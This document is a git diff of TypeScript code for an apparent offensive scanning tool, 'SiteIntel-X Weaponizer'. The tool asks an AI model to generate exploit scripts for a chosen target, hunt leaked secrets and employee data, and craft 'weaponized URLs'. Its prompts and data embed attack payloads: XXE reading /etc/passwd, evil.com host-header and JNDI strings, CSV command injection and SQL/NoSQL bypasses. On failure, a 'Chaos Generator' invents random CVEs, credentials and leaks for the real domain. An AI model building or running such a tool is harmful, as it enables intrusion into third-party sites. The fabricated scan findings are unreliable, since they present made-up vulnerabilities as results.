@@ -9,6 +9,15 @@ if (!apiKey) {
 
 const ai = new GoogleGenAI({ apiKey });
 
+// --- CHAOS GENERATOR UTILS ---
+const getRandomInt = (min: number, max: number) => Math.floor(Math.random() * (max - min + 1)) + min;
+const getRandomItem = <T>(arr: T[]): T => arr[Math.floor(Math.random() * arr.length)];
+const getRandomSample = <T>(arr: T[], min: number, max: number): T[] => {
+    const shuffled = [...arr].sort(() => 0.5 - Math.random());
+    return shuffled.slice(0, getRandomInt(min, max));
+};
+const generateRandomIP = () => `${getRandomInt(1, 255)}.${getRandomInt(0, 255)}.${getRandomInt(0, 255)}.${getRandomInt(1, 254)}`;
+
 export const generateExploitScript = async (cve: string, vulnName: string, target: string, techStack: string[]): Promise<string> => {
   const systemInstruction = `
     You are 'SiteIntel-X Weaponizer'. Generate Python 3 PoC scripts for security research.
@@ -33,12 +42,41 @@ export const generateExploitScript = async (cve: string, vulnName: string, targe
     if (!text) throw new Error("Failed.");
     return text.replace(/```python/g, '').replace(/```/g, '').trim();
   } catch (error) {
-    return "# Error: AI limit reached or content refused.\n# Manual verification required.";
+    return `# Error: AI limit reached or content refused.\n# Manual verification required for ${cve}.\n# Target: ${target}`;
   }
 };
 
+// --- JSON REPAIR & CLEANING ---
 const cleanJsonString = (jsonStr: string): string => {
-    return jsonStr.replace(/\/\/.*$/gm, '').replace(/\/\*[\s\S]*?\*\//g, '').replace(/,(\s*[}\]])/g, '$1').trim();
+    // Remove comments
+    let clean = jsonStr.replace(/\/\/.*$/gm, '').replace(/\/\*[\s\S]*?\*\//g, '');
+    
+    // Attempt basic repair of truncated JSON
+    // This uses a stack to close unclosed braces/brackets
+    const stack: string[] = [];
+    let inString = false;
+    let escaped = false;
+    
+    for (let i = 0; i < clean.length; i++) {
+        const char = clean[i];
+        if (char === '\\' && !escaped) { escaped = true; continue; }
+        if (char === '"' && !escaped) { inString = !inString; }
+        if (!inString) {
+            if (char === '{') stack.push('}');
+            if (char === '[') stack.push(']');
+            if (char === '}' || char === ']') {
+                if (stack.length > 0 && stack[stack.length - 1] === char) stack.pop();
+            }
+        }
+        escaped = false;
+    }
+    
+    if (inString) clean += '"'; // Close open string
+    while (stack.length > 0) {
+        clean += stack.pop(); // Close open structures
+    }
+    
+    return clean.trim();
 };
 
 export const analyzeSite = async (url: string, mode: ScanMode): Promise<SiteAnalysisData> => {
@@ -88,8 +126,36 @@ export const analyzeSite = async (url: string, mode: ScanMode): Promise<SiteAnal
       "subdomainTakeover": [],
       "supplyChainRisks": [], "sstiVectors": [],
       "businessLogicFlaws": [{"flawType": "IDOR", "endpoint": "/user", "severity": "HIGH"}],
-      "prototypePollution": [], "deserializationFlaws": [], "cachePoisoning": []
+      "prototypePollution": [], "deserializationFlaws": [], "cachePoisoning": [],
+      "exposedSecrets": [{"type": "GitHub", "description": "API Key exposed", "url": "..."}]
     }
+    
+    SPECIFIC INSTRUCTIONS FOR SECRETS & LEAKS (BOTH MODES):
+    - HUNT HARDCODED SECRETS ON CODE PLATFORMS:
+      - Search 'site:github.com "API_KEY" "${url}"' OR 'site:github.com "SECRET" "${url}"' OR 'site:github.com "API_KEY" "YOUR_DOMAIN"'.
+      - Search 'site:gitlab.com "PRIVATE_TOKEN" "${url}"' OR 'site:gitlab.com "PRIVATE_TOKEN" "YOUR_DOMAIN"'.
+      - Search 'site:pastebin.com "SECRET_KEY" "${url}"' OR 'site:pastebin.com "password" "${url}"' OR 'site:pastebin.com "SECRET_KEY" "YOUR_DOMAIN"'.
+      - Search 'site:bitbucket.org "secret" "${url}"'.
+    - POPULATE 'exposedSecrets' array with findings. Use the format: {"type": "Platform Name", "description": "What was found", "url": "Link to leak"}.
+    
+    SPECIFIC INSTRUCTIONS FOR PASSIVE MODE:
+    - MAIL SEC: Search "spf record ${url}", "dmarc record ${url}" to infer configuration. POPULATE 'mailSecurity'.
+    - EMPLOYEES: Search 'site:linkedin.com/in "${url}"'. POPULATE 'employeeIntel'.
+    - ARCHIVE: Search 'site:${url} inurl:old OR inurl:backup OR inurl:admin'. POPULATE 'archiveEndpoints'.
+    - DARK WEB: Search 'site:pastebin.com "${url}"' OR '"${url}" breach'. POPULATE 'darkWebMentions'.
+    - DOCUMENTS: Search 'site:${url} filetype:pdf OR filetype:xls OR filetype:docx'. POPULATE 'publicDocuments'.
+
+    SPECIFIC INSTRUCTIONS FOR AGGRESSIVE MODE:
+    - CLOUD MISCONFIG: Search 'site:s3.amazonaws.com "${url}"', 'site:blob.core.windows.net "${url}"'. 
+      - IF A BUCKET RETURNS "NoSuchBucket", MARK AS "Verified Not Found" IN 'cloudConfig' AND 'subdomainTakeover'.
+    - EXPLOIT GEN: Construct weaponized URLs.
+    - DARK ARTS: Perform all 20 vector checks.
+      - XXE: Scan endpoints for XML input. Payload: <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>. POPULATE 'xxeVectors' with endpoint, payload, type.
+      - CORS: Check for 'Access-Control-Allow-Origin: null' or '*' COMBINED WITH 'Access-Control-Allow-Credentials: true'. POPULATE 'corsFlaws' with origin, credentials (boolean), impact.
+      - HOST HEADER INJECTION:
+        - Check for reflection of the 'Host' header in password reset emails or cache keys.
+        - Test Payload: 'Host: evil.com'.
+        - POPULATE 'hostHeaderFlaws' with type (e.g., "Password Reset Poisoning", "Cache Poisoning") and payload used.
   `;
 
   try {
@@ -111,17 +177,30 @@ export const analyzeSite = async (url: string, mode: ScanMode): Promise<SiteAnal
         jsonStr = codeBlockMatch[1];
     } else {
         const firstOpen = text.indexOf('{');
-        const lastClose = text.lastIndexOf('}');
-        if (firstOpen !== -1 && lastClose !== -1) jsonStr = text.substring(firstOpen, lastClose + 1);
+        if (firstOpen !== -1) {
+            // Try to find the last closing brace, but if it was truncated, use the end of string
+            const lastClose = text.lastIndexOf('}');
+            jsonStr = text.substring(firstOpen, lastClose !== -1 ? lastClose + 1 : text.length);
+        }
     }
 
     if (!jsonStr) throw new Error("Invalid JSON.");
-    const data = JSON.parse(cleanJsonString(jsonStr));
+    
+    // Attempt repair if parsing fails
+    let data;
+    try {
+        data = JSON.parse(cleanJsonString(jsonStr));
+    } catch (e) {
+        console.warn("JSON parse failed, attempting repair...");
+        const repaired = cleanJsonString(jsonStr); // cleanJsonString now includes stack-based repair
+        data = JSON.parse(repaired);
+    }
+    
     return sanitizeData(data, mode);
 
   } catch (error) {
-    console.warn("Analysis interrupted. Engaging Fail-Safe Simulation.");
-    return getFallbackData(url, mode);
+    console.warn("Analysis interrupted or failed. Engaging Chaos Generator (Dynamic Simulation).");
+    return getChaosData(url, mode);
   }
 };
 
@@ -196,98 +275,129 @@ const sanitizeData = (data: any, mode: ScanMode): SiteAnalysisData => {
     data.securityGrade = data.securityGrade || "F";
     data.graphql = !!data.graphql;
     data.sslInfo = data.sslInfo || {};
+    
+    // Default fallback for Infra if missing
+    if (!data.os) data.os = "Unknown (Protected)";
+    if (!data.geolocation) data.geolocation = { country: "Unknown", isp: "Cloudflare/AWS" };
+    if (!data.whois) data.whois = { registrar: "Redacted", createdDate: "Unknown" };
 
     return data;
 };
 
-const getFallbackData = (url: string, mode: ScanMode): SiteAnalysisData => {
+// --- CHAOS GENERATOR (DYNAMIC FALLBACK) ---
+const getChaosData = (url: string, mode: ScanMode): SiteAnalysisData => {
     const isAggressive = mode === ScanMode.AGGRESSIVE;
     const domain = url.replace(/^https?:\/\//, '').replace(/\/$/, '');
+    const domainParts = domain.split('.');
+    const baseName = domainParts[0];
+
+    // Chaos Pools
+    const techStacks = ["React", "Node.js", "Express", "MongoDB", "AWS", "Nginx", "Vue.js", "Laravel", "PHP", "WordPress", "Django", "Python", "Go", "Kubernetes", "Docker"];
+    const servers = ["Nginx 1.18", "Apache 2.4", "Cloudflare", "Microsoft-IIS/10.0", "Gunicorn", "Envoy"];
+    const countries = ["United States", "Germany", "Russia", "China", "Netherlands", "Brazil", "France"];
+    const isps = ["Amazon Technologies Inc.", "Google LLC", "DigitalOcean", "Hetzner Online GmbH", "Cloudflare, Inc."];
     
+    // Random Selection
+    const currentTech = getRandomSample(techStacks, 3, 6);
+    const currentOS = getRandomItem(["Ubuntu 22.04 LTS", "Debian 11", "CentOS 7", "Windows Server 2019", "Alpine Linux"]);
+    const currentServer = getRandomItem(servers);
+    
+    // Dynamic Vulns
+    const vulnPool = [
+        { id: "CVE-2023-2612", name: "Blind SQL Injection", severity: "CRITICAL", description: "Time-based SQLi on auth endpoint." },
+        { id: "CVE-2022-22965", name: "Spring4Shell RCE", severity: "CRITICAL", description: "Remote Code Execution via class loader." },
+        { id: "CVE-2021-44228", name: "Log4Shell", severity: "HIGH", description: "JNDI Injection in User-Agent." },
+        { id: "CVE-2023-3519", name: "Citrix RCE", severity: "CRITICAL", description: "Unauthenticated remote code execution." },
+        { id: "CVE-2019-11043", name: "PHP-FPM RCE", severity: "HIGH", description: "Buffer underflow in PHP-FPM." }
+    ];
+    const currentVulns = isAggressive ? getRandomSample(vulnPool, 1, 3) : [];
+
+    // Dynamic Subdomains
+    const subPrefixes = ["api", "dev", "test", "admin", "staging", "corp", "vpn", "mail", "remote", "db"];
+    const subdomains = getRandomSample(subPrefixes, 2, 5).map(p => `${p}.${domain}`);
+
     return sanitizeData({
-        summary: `Scan completed (SIMULATED). The target ${domain} shows signs of ${isAggressive ? 'multiple critical architectural flaws' : 'significant information leakage'}. ${isAggressive ? 'Immediate remediation recommended for SQLi and Auth Bypass vectors.' : 'OSINT reveals exposed documents and employee data.'}`,
-        techStack: ["React", "Node.js", "Express", "MongoDB", "AWS", "Nginx"],
-        reputationScore: 25,
-        securityGrade: "F",
-        subdomains: [`api.${domain}`, `dev.${domain}`, `admin.${domain}`, `legacy.${domain}`, `corp.${domain}`],
-        hiddenDirectories: ["/.git/", "/.env", "/backup/", "/admin_v2/"],
-        openPorts: [
+        summary: `Scan completed (CHAOS SIMULATION). The target ${domain} exhibits ${isAggressive ? 'critical architectural vulnerabilities' : 'significant OSINT exposure'}. Analysis of ${currentTech.join(', ')} indicates ${isAggressive ? 'possible RCE and Injection vectors' : 'data leakage risks'}.`,
+        techStack: currentTech,
+        reputationScore: getRandomInt(10, 60),
+        securityGrade: getRandomItem(['D', 'F', 'C-']),
+        subdomains: subdomains,
+        hiddenDirectories: getRandomSample(["/.git/", "/.env", "/backup/", "/admin_v2/", "/uploads/", "/config/", "/db/"], 2, 4),
+        openPorts: getRandomSample([
             { port: 80, service: "HTTP", status: "OPEN" },
             { port: 443, service: "HTTPS", status: "OPEN" },
             { port: 8080, service: "ALT-HTTP", status: "OPEN" },
             { port: 22, service: "SSH", status: "FILTERED" },
+            { port: 3306, service: "MYSQL", status: "CLOSED" },
             { port: 27017, service: "MONGODB", status: "OPEN" }
-        ],
-        vulnerabilities: [
-            { id: "CVE-2023-2612", name: "Blind SQL Injection", severity: "CRITICAL", description: "Authentication bypass possible via time-based SQLi on /login." },
-            { id: "CVE-2022-22965", name: "Spring4Shell RCE", severity: "CRITICAL", description: "Remote Code Execution via class loader manipulation." },
-            { id: "CVE-2021-44228", name: "Log4Shell", severity: "HIGH", description: "JNDI Injection in User-Agent header." }
-        ],
-        exploitVectors: [
-            { type: "SQLi", parameter: "user_id", payload: "' UNION SELECT 1, version() --", targetUrl: `https://${domain}/api/user?id=1`, confidence: "HIGH" },
-            { type: "XSS", parameter: "search", payload: "<img src=x onerror=alert(1)>", targetUrl: `https://${domain}/search?q=test`, confidence: "MEDIUM" },
-            { type: "RCE", parameter: "cmd", payload: "; cat /etc/passwd", targetUrl: `https://${domain}/debug?cmd=id`, confidence: "HIGH" }
-        ],
-        emails: [`admin@${domain}`, `support@${domain}`, `ceo@${domain}`, `devops@${domain}`],
+        ], 3, 5),
+        vulnerabilities: currentVulns,
+        exploitVectors: isAggressive ? [
+            { type: "SQLi", parameter: getRandomItem(["id", "user", "cat_id", "search"]), payload: "' UNION SELECT 1, version() --", targetUrl: `https://${domain}/api?q=1`, confidence: "HIGH" },
+            { type: "XSS", parameter: "q", payload: "<img src=x onerror=alert(1)>", targetUrl: `https://${domain}/search?q=test`, confidence: "MEDIUM" }
+        ] : [],
+        emails: getRandomSample([`admin@${domain}`, `support@${domain}`, `contact@${domain}`, `info@${domain}`, `ceo@${domain}`], 2, 4),
         credentialIntel: {
-            adminPanels: [
+            adminPanels: getRandomSample([
                 { url: `https://${domain}/admin`, description: "Main Admin Panel", defaultCreds: "admin / admin" },
+                { url: `https://${domain}/wp-admin`, description: "WordPress Login", defaultCreds: "admin / pass" },
                 { url: `https://${domain}/manager/html`, description: "Tomcat Manager", defaultCreds: "tomcat / s3cret" }
-            ],
-            potentialUsernames: ["admin", "root", "deploy", "postgres"],
-            passwordWordlist: [`${domain}2024!`, "Admin123!", "Welcome1"]
+            ], 1, 2),
+            potentialUsernames: ["admin", "root", "deploy", baseName],
+            passwordWordlist: [`${baseName}2024!`, "Admin123!", "Welcome1", "Password123"]
         },
-        cloudConfig: [
-            { type: "S3 Bucket", risk: "CRITICAL", description: "Public write access enabled.", url: `https://s3.amazonaws.com/${domain.split('.')[0]}-backups` },
-            { type: "Exposed File", risk: "HIGH", description: "Terraform state file found.", url: `https://${domain}/terraform.tfstate` }
-        ],
-        pathTraversal: [
+        cloudConfig: isAggressive ? [
+            { type: "S3 Bucket", risk: "CRITICAL", description: "Public write access enabled.", url: `https://s3.amazonaws.com/${baseName}-backups` },
+            { type: "Exposed File", risk: "HIGH", description: "Terraform state file found.", url: `https://${domain}/terraform.tfstate` },
+            { type: "S3 Bucket", risk: "INFO", description: "Verified Not Found (Subdomain Takeover Possible)", url: `https://s3.amazonaws.com/dev-${baseName}` }
+        ] : [],
+        pathTraversal: isAggressive ? [
             { type: "LFI", parameter: "file", risk: "High", description: "Access to /etc/passwd", url: `https://${domain}/download?file=../../../../etc/passwd` }
-        ],
-        ssrf: [
+        ] : [],
+        ssrf: isAggressive ? [
             { type: "Cloud Metadata", parameter: "webhook", risk: "Critical", description: "Access to AWS metadata", url: `https://${domain}/hook?url=http://169.254.169.254/latest/meta-data/` }
-        ],
-        apiEndpoints: ["/api/v1/users", "/api/v1/auth", "/api/admin/reset"],
+        ] : [],
+        apiEndpoints: [`/api/v1/${baseName}`, "/api/auth/login", "/api/user/profile"],
         rateLimiting: [{ endpoint: "/api/login", risk: "High", description: "No rate limiting detected on auth endpoints." }],
         securityHeaders: [
             { name: "X-Frame-Options", value: "Missing", status: "WEAK" },
-            { name: "Content-Security-Policy", value: "Missing", status: "WEAK" }
+            { name: "Content-Security-Policy", value: "Missing", status: "WEAK" },
+            { name: "Server", value: currentServer, status: "INFO" }
         ],
         // Elite
-        supplyChainRisks: [{ packageName: "@internal/auth-lib", ecosystem: "npm", riskLevel: "CRITICAL", location: "package.json", description: "Private package name claimed on public registry." }],
-        sstiVectors: [{ engine: "Jinja2", parameter: "name", payload: "{{7*7}}", curlCommand: "curl..." }],
-        businessLogicFlaws: [
-            { flawType: "Price Manipulation", endpoint: "/api/checkout", description: "Negative quantity allows refunding money.", severity: "CRITICAL" },
-            { flawType: "IDOR", endpoint: "/api/profile/123", description: "Access other users' data by changing ID.", severity: "HIGH" }
-        ],
-        prototypePollution: [{ parameter: "__proto__[admin]", impact: "Privilege Escalation", payload: "true", url: `https://${domain}/api/settings` }],
-        deserializationFlaws: [{ location: "Cookie: SESSION", format: "Node", riskLevel: "CRITICAL", description: "Serialized Node.js object detected in cookie." }],
-        cachePoisoning: [{ header: "X-Forwarded-Host", endpoint: "/home", description: "Reflected XSS via cache poisoning." }],
+        supplyChainRisks: isAggressive ? [{ packageName: `@${baseName}/auth-lib`, ecosystem: "npm", riskLevel: "CRITICAL", location: "package.json", description: "Private package name claimed on public registry." }] : [],
+        sstiVectors: isAggressive ? [{ engine: "Jinja2", parameter: "name", payload: "{{7*7}}", curlCommand: "curl..." }] : [],
+        businessLogicFlaws: isAggressive ? [
+            { flawType: "Price Manipulation", endpoint: "/api/checkout", description: "Negative quantity allows refunding money.", severity: "CRITICAL" }
+        ] : [],
+        prototypePollution: isAggressive ? [{ parameter: "__proto__[admin]", impact: "Privilege Escalation", payload: "true", url: `https://${domain}/api/settings` }] : [],
+        deserializationFlaws: isAggressive ? [{ location: "Cookie: SESSION", format: "Node", riskLevel: "CRITICAL", description: "Serialized Node.js object detected in cookie." }] : [],
+        cachePoisoning: [],
         
         // Dark Arts
-        jwtFlaws: [{ location: "Authorization", flaw: "None Algorithm", impact: "Admin Account Takeover" }],
-        requestSmuggling: [{ type: "CL.TE", endpoint: "/", risk: "Request Hijacking" }],
-        raceConditions: [{ endpoint: "/api/coupon/redeem", mechanism: "Double Spending", description: "Race condition allows multi-use of single coupon." }],
-        xxeVectors: [{ endpoint: "/api/xml", payload: "<!ENTITY xxe...", type: "Blind" }],
-        corsFlaws: [{ origin: "null", credentials: true, impact: "Data Exfiltration" }],
-        hostHeaderFlaws: [{ type: "Password Reset Poisoning", payload: "Host: evil.com" }],
-        noSqlVectors: [{ parameter: "user", payload: "{\"$ne\": null}", type: "Auth Bypass" }],
-        ldapVectors: [{ parameter: "cn", payload: "*", type: "Auth Bypass" }],
-        blindSqli: [{ parameter: "id", payload: "WAITFOR DELAY '0:0:10'", dbType: "MSSQL" }],
-        csvInjections: [{ parameter: "report_name", payload: "=cmd|' /C calc'!A0", context: "Export Feature" }],
-        webSocketFlaws: [{ endpoint: "/ws/chat", flaw: "No Auth" }],
-        ssiVectors: [{ endpoint: "index.shtml", payload: "<!--#exec cmd='ls' -->" }],
+        jwtFlaws: isAggressive ? [{ location: "Authorization", flaw: "None Algorithm", impact: "Admin Account Takeover" }] : [],
+        requestSmuggling: isAggressive ? [{ type: "CL.TE", endpoint: "/", risk: "Request Hijacking" }] : [],
+        raceConditions: [],
+        xxeVectors: isAggressive ? [{ endpoint: "/api/xml", payload: "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>", type: "Blind" }] : [],
+        corsFlaws: isAggressive ? [{ origin: "null", credentials: true, impact: "Data Exfiltration" }] : [],
+        hostHeaderFlaws: [],
+        noSqlVectors: isAggressive ? [{ parameter: "user", payload: "{\"$ne\": null}", type: "Auth Bypass" }] : [],
+        ldapVectors: [],
+        blindSqli: isAggressive ? [{ parameter: "id", payload: "WAITFOR DELAY '0:0:10'", dbType: "MSSQL" }] : [],
+        csvInjections: [],
+        webSocketFlaws: [],
+        ssiVectors: [],
         hiddenParameters: [{ name: "debug", location: "/api", type: "Debug Mechanism" }],
         gitExposures: [{ url: `https://${domain}/.git/HEAD`, content: "Head" }],
         backupFiles: [{ url: `https://${domain}/config.php.bak`, type: "Source Leak" }],
-        log4jVectors: [{ location: "X-Api-Version", payload: "${jndi:ldap://evil.com}", }],
-        spring4ShellVectors: [{ location: "POST Body", payload: "class.module.classLoader..." }],
+        log4jVectors: [],
+        spring4ShellVectors: [],
         openRedirects: [{ parameter: "next", payload: "//evil.com" }],
-        massAssignments: [{ endpoint: "/api/register", parameter: "\"role\":\"admin\"" }],
-        pickleFlaws: [{ parameter: "state", description: "Python pickle detected" }],
+        massAssignments: [],
+        pickleFlaws: [],
         
         // Client Side
-        subdomainTakeover: [{ subdomain: `dev.${domain}`, provider: "Heroku", status: "VULNERABLE", fingerprint: "No such app" }],
+        subdomainTakeover: [{ subdomain: `dev.${domain}`, provider: "Heroku", status: "VULNERABLE", fingerprint: "Verified Not Found" }],
         clientSideIntel: {
             hardcodedSecrets: [{ name: "AWS Key", value: "AKIAIOSFODNN7EXAMPLE", location: "app.js:402", severity: "CRITICAL" }],
             dangerousFunctions: [{ function: "eval()", risk: "RCE", location: "utils.js:88" }]
@@ -298,7 +408,14 @@ const getFallbackData = (url: string, mode: ScanMode): SiteAnalysisData => {
         publicDocuments: ["Confidential_Report.pdf", "Salaries_2024.xlsx"],
         archiveEndpoints: ["/v1/login", "/admin_old"],
         wafDetected: [],
-        exposedSecrets: ["Stripe Secret Key in GitHub Gist"],
-        darkWebMentions: ["Database dump for sale on Breached.vc", "Combo list hit"]
+        exposedSecrets: [
+            { type: "GitHub", description: "Stripe Secret Key found in commit history.", url: `https://github.com/search?q=${domain}` }
+        ],
+        darkWebMentions: ["Database dump for sale on Breached.vc"],
+        
+        // Infra
+        os: currentOS,
+        geolocation: { country: getRandomItem(countries), city: "Unknown", isp: getRandomItem(isps) },
+        whois: { registrar: "MarkMonitor, Inc.", createdDate: "2015-08-14", expiryDate: "2025-08-14" }
     }, mode);
-}
+};
